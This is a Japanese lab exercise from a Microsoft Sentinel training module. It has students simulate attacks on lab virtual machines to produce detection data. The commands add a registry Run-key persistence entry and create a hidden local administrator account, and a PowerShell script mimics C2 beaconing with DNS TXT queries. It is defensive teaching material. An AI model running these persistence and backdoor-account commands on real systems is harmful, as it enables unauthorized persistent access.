---
lab:
    title: '演習 5 - 攻撃の実施'
    module: 'モジュール 7 – Microsoft Sentinel を使用して脅威を検出し、調査を実行する'
---

# モジュール 7 - ラボ 1 - 演習 5 - 攻撃の実施


### タスク 1: Defender for Endpoint によって構成した Windows を攻撃します。

このタスクでは、Microsoft Defender for Endpoint が構成されているホストに対して攻撃を実行します。

1. 管理者として WIN1 仮想マシンにログインします。パスワードは**Pa55w.rd** です。  

2. タスク バーの検索で、*Command* と入力します。  検索結果にコマンド プロンプトが表示されます。  コマンド プロンプトを右クリックして、**「管理者として実行」** を選択します。表示されるユーザー アカウント制御ウィンドウで、「**はい**」を選択して、アプリの実行を許可します。

3. コマンドプロンプトで、各行の後に Enter キーを押して、各行にコマンドを入力します。

```Command
cd \
mkdir temp
cd temp
```
4. 攻撃 1 -このコマンドをコピーしてコマンド プロンプト アプリに実行します。

```Command
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

5. 攻撃 3 -次のコマンドをコピーして実行します。

```Command
notepad c2.ps1
```
「**はい**」を選択して新しいファイルを作成し、以下の PowerShell スクリプトを *c2.ps1* にコピーします。

>**注:** 仮想マシンへの貼り付けには長さの制限がある場合があります。手順から直接コピーすることができない場合、このコードを 3 つのセクションに貼り付けて、すべてのスクリプトが仮想マシンに貼り付けられるようにします。  スクリプトがメモ帳の *c2.ps1* ファイル内のこれらの手順のように見えることを確認してください。

```PowerShell
param(
    [string]$Domain = "microsoft.com",
    [string]$Subdomain = "subdomain",
    [string]$Sub2domain = "sub2domain",
    [string]$Sub3domain = "sub3domain",
    [string]$QueryType = "TXT",
        [int]$C2Interval = 8,
        [int]$C2Jitter = 20,
        [int]$RunTime = 240
)

$RunStart = Get-Date
$RunEnd = $RunStart.addminutes($RunTime)

$x2 = 1
$x3 = 1 
Do {
    $TimeNow = Get-Date
    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout

    if ($x2 -eq 3 )
    {
        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
         $x2 = 1
    }
    else
    {
        $x2 = $x2 + 1
    }
    
    if ($x3 -eq 7 )
    {
        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x3 = 1
    }
    else
    {
        $x3 = $x3 + 1
    }

    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
    Start-Sleep -Seconds $Jitter
}
Until ($TimeNow -ge $RunEnd)
```

メモ帳のメニューで、「**ファイル**」を選択し、次に「**保存**」を選択します。「コマンド プロンプト」ウィンドウで、各行にコマンドを入力し、各行の後に「Enter」キーを押します。**注:** 解決エラーが表示されます。これは予測されていることです。

```Command
powershell
.\c2.ps1
```

>**重要:** ウィンドウを閉じないでください。このコマンド/パワーシェルスクリプトをバックグラウンドで実行します。コマンドは、数時間ログエントリを生成する必要があります。このスクリプトの実行中に次のタスクや次の演習に進むことができます。このタスクで作成したデータは、後で脅威の捜索ラボで使用します。このプロセスでは、大量のデータや処理を作成することはありません。


### タスク 2: Sysmon で構成された攻撃ウィンドウ

このタスクでは、セキュリティ イベント コネクタが構成され、Sysmon が構成されているホストに対して攻撃を実行します。

1. 管理者として WIN2 仮想マシンにログインします。パスワードは**Pa55w.rd** です。  

2. タスク バーの検索で、*CMD* と入力します。  検索結果にコマンド プロンプトが表示されます。コマンド プロンプトを右クリックして、**「管理者として実行」** を選択します。表示されるユーザー アカウント制御ウィンドウで、「**はい**」を選択して、アプリの実行を許可します。

3. コマンドプロンプトで、各行の後に Enter キーを押して、各行にコマンドを入力します。

```Command
cd \
mkdir temp
cd \temp
```

4. 攻撃 1 - このコマンドをコピーしてコマンド プロンプト アプリに実行します。

```Command
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

>**注:** WIN1と同様な、同じ「*永続化*」戦術を使用していますが、次の演習では異なる検出を使用します。

5. 攻撃 2 - このコマンドをコピーして実行し、各行の後に Enter キーを押して各行にコマンドを入力します。

```Command
net user theusernametoadd /add
net user theusernametoadd ThePassword1!
net localgroup administrators theusernametoadd /add
```

## 演習 6 に進みます。
